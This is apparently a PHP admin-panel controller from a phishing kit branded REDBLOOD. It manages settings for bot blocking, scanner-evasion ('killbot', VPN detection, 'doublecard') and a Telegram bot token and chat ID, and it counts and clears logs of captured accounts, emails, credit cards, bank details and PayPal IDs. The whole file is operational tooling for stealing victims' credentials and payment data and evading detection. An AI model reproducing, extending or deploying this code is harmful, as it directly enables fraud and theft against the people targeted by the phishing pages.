<?php

defined("ALLOW") or exit('No direct script access allowed');

class Panel
{

    private $_TOKEN = FCPATH . "REDBLOOD/Go/.settings.ini";
    public function index()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (!is_file($this->_TOKEN)) {
            header('Location: ' . base_url() . 'security-check/install');
            exit();
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/dashboard');
        }
    }

    public function login()
    {
        if (isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel');
        } else if (!is_file($this->_TOKEN)) {
            header('Location: ' . base_url() . 'security-check/install');
            exit();
        } else {

            echo view('panel/login');
        }
    }

    public function process()
    {
        if (isset($_POST['action'])) {
            $token = $_POST['token'];

            if (empty($token)) {
                $_SESSION["sukses"] = 'swal("Error!", "Please Fill in All Fields Correctly", "ERROR!");';
                header('Location: ' . base_url() . 'security-check/panel/login');
                exit();
            } else if ($token == _config('TOKEN')) {
                $_SESSION['token'] = $token;
                header('Location: ' . base_url() . 'security-check/panel');
            } else {
                $_SESSION["sukses"] = 'swal("Error!", "WRONG LICENSE!", "ERROR!");';
                header('Location: ' . base_url() . 'security-check/panel/login');
                exit();
            }
        }
    }

    public function settings()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/settings');
        }
    }
    public function update()
    {
        if (isset($_POST['updatesetting'])) {
            $result           = $_POST["result"];
            $parameter           = $_POST["parameter"];
            $rbtoken           = $_POST["rbtoken"];
            $antibot           = $_POST["antibot"];
            $killbot           = $_POST["killbot"];
            $getaccount           = $_POST["getaccount"];
            $vpndetect           = $_POST["vpndetect"];
            $doublecard          = $_POST["doublecard"];
            $token          = $_POST["token"];
            $telegram       = $_POST["telegram"];
            if (empty($token && $result && $parameter && $rbtoken && $antibot && $killbot && $getaccount && $vpndetect && $doublecard && $telegram)) {
                $_SESSION["sukses"] = 'swal("Error!", "Please input all fields.", "error");';
                echo json_encode(array("status" => "Please Fill in All Fields Correctly", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/settings');
                exit();
            } else if (_config('TOKEN') !== $token) {
                $_SESSION["sukses"] = 'swal("Error!", "edit not successful.", "error");';
                echo json_encode(array("status" => "edit not successful.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/settings');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "REDBLOOD/Go/.settings.ini", "w");
                fwrite($f, "TOKEN = \"$token\"\nRESULT = \"$result\"\nPARAMETER = \"$parameter\"\nRBTOKEN = \"$rbtoken\"\nANTIBOT = \"$antibot\"\nKILLBOT = \"$killbot\"\nGETACCOUNT = \"$getaccount\"\nVPNDETECT = \"$vpndetect\"\nDOUBLECARD = \"$doublecard\"\nTELEGRAM = \"$telegram\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("success!", "CONFIG UPDATE.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'security-check/panel/settings');
                exit();
            }
        }

        if (isset($_POST['gasreset'])) {
            $resetlog = $_POST['resetlog'];

            if (empty($resetlog)) {
                $_SESSION["sukses"] = 'swal("Error!", "SYSTEM ERROR.", "error");';
                echo json_encode(array("status" => "System error.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "UNDETECT SESSION.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else if ($resetlog == "resetlog") {
                foreach (['log_account.txt', 'log_cc.txt', 'log_robot.txt', 'log_email.txt', 'log_click.txt'] as $filename) {
                    file_put_contents(FCPATH . "REDBLOOD/Static/$filename", "");
                }
                $_SESSION["sukses"] = 'swal("success!", "LOGS CLEAR.", "success");';
                echo json_encode(array("status" => "Reset Log Success.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel');
            } else {
                $_SESSION["sukses"] = 'swal("Error!", "SYSTEM ERROR.", "error");';
                echo json_encode(array("status" => "System error.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel');
                exit();
            }
        }

        if (isset($_POST['updatetoken'])) {
            $rbtoken           = $_POST["rbtoken"];
            if (empty($rbtoken)) {
                $_SESSION["sukses"] = 'swal("Error!", "Please Fill in All Fields Correctly.", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/RBbkr');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "UNDETECT SESSION.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "REDBLOOD/Go/RBblocker.ini", "w");
                fwrite($f, "TOKEN = \"$rbtoken\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("success!", "CONFIG UPDATE", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'security-check/panel/RBbkr');
                exit();
            }
        }

        if (isset($_POST['updateantibot'])) {
            $antibot           = $_POST["antibot"];
            if (empty($antibot)) {
                $_SESSION["sukses"] = 'swal("Error!", "Please Fill in All Fields Correctly", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/antibot');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "UNDETECT SESSION.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "REDBLOOD/Go/antibot.ini", "w");
                fwrite($f, "KEY = \"$antibot\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("success!", "CONFIG UPDATE.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'security-check/panel/antibot');
                exit();
            }
        }
        
        if (isset($_POST['uptel'])) {
            $token        = $_POST["token"];
            $id           = $_POST["id"];
            if (empty($token) && empty($id)) {
                $_SESSION["sukses"] = 'swal("error!", "SYSTEM ERROR!.", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/telegram');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "REDBLOOD/Go/telegram.ini", "w");
                fwrite($f, "token = \"$token\"\nidtelegram = \"$id\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("success!", "UPDATE SUCCESS.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'security-check/panel/telegram');
                exit();
            }
        }
        if (isset($_POST['updatekillbot'])) {
            $killbot           = $_POST["killbot"];
            if (empty($killbot)) {
                $_SESSION["sukses"] = 'swal("Error!", "Please Fill in All Fields Correctly", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/killbot');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.redbloodcode.com"));
                header('Location: ' . base_url() . 'security-check/panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "REDBLOOD/Go/killbot.ini", "w");
                fwrite($f, "KEY = \"$killbot\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("success!", "CONFIG UPDATE.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'security-check/panel/killbot');
                exit();
            }
        }
    }

    public function antibot()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/antibot');
        }
    }
    
        public function product()
    {
        echo view('panel/product');
    }

        public function about()
    {
        echo view('panel/about');
    }

        public function telegram()
    {
         echo view('panel/telegram');
    }
    


    public function killbot()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/killbot');
        }
    }

    public function RBbkr()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/RBblocker');
        }
    }

    public function static()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'security-check/panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'security-check/panel/logout');
            exit();
        } else {
            echo view('panel/static');
        }
    }

    public function finished()
    {
        echo view('panel/finished');
    }

    public function logout()
    {
        session_start();
        session_destroy();
        echo json_encode(array("status" => "Logout Successful", "site" => "https://www.redbloodcode.com"));
        header('Location: ' . base_url() . 'security-check/panel/login');
    }

    public function logclick()
    {
        if (file_exists(FCPATH . "REDBLOOD/Static/log_click.txt")) {
            $bit = file_get_contents(FCPATH . "REDBLOOD/Static/log_click.txt");
            $bit = explode("\n", $bit);
            $list = array_reverse($bit);
            foreach ($list as $rb) {
                $rb = explode("|", $rb);
                $flag = $rb[1];
                $time = $rb[2];
                $ip = $rb[3];
                $countryname = $rb[4];
                $os = $rb[5];
                $type = $rb[6];
                if ($ip == "") {
                } else {
                    echo "<tr>
                        <td><img src='" . $flag . "' style='width: 50px;height: 30px;'></img></td>
                        <td>" . $ip . "</td>
                        <td>" . $countryname . "</td>
                        <td>" . $os . "</td>
                        <td>" . $type . "</td>
                        <td>" . $time . "</td>
                        </tr>";
                }
            }
        } else {
            echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
        }
    }

    public function json()
    {
        $log_account = file_get_contents(FCPATH . 'REDBLOOD/Static/log_account.txt');
        $log_email      = file_get_contents(FCPATH . 'REDBLOOD/Static/log_email.txt');
        $log_cc       = file_get_contents(FCPATH . 'REDBLOOD/Static/log_cc.txt');
        $log_bank      = file_get_contents(FCPATH . 'REDBLOOD/Static/log_bank.txt');
        $log_click      = file_get_contents(FCPATH . 'REDBLOOD/Static/log_click.txt');
        $log_pap      = file_get_contents(FCPATH . 'REDBLOOD/Static/log_papid.txt');
        $log_robot      = file_get_contents(FCPATH . 'REDBLOOD/Static/log_robot.txt');

        $parseAccount = explode("\r\n", $log_account);
        $parseEmail   = explode("\r\n", $log_email);
        $parseCC       = explode("\r\n", $log_cc);
        $parseBank  = explode("\r\n", $log_bank);
        $parseclick       = explode("\r\n", $log_click);
        $parsepap      = explode("\r\n", $log_pap);
        $parserobot      = explode("\r\n", $log_robot);
        

        echo json_encode(array(
            'logaccount' => @(int) (count($parseAccount) - 1) ? (int) (count($parseAccount) - 1) : "0",
            'logemail'  => @(int) (count($parseEmail) - 1) ? (int) (count($parseEmail) - 1) : "0",
            'logcard'   => @(int) (count($parseCC) - 1) ? (int) (count($parseCC) - 1) : "0",
            'logbank'   => @(int) (count($parseBank) - 1) ? (int) (count($parseBank) - 1) : "0",
            'logclick'   => @(int) (count($parseclick) - 1) ? (int) (count($parseclick) - 1) : "0",
            'logpap'   => @(int) (count($parsepap) - 1) ? (int) (count($parsepap) - 1) : "0",
            'logrobot'   => @(int) (count($parserobot) - 1) ? (int) (count($parserobot) - 1) : "0"
        ));
    }
}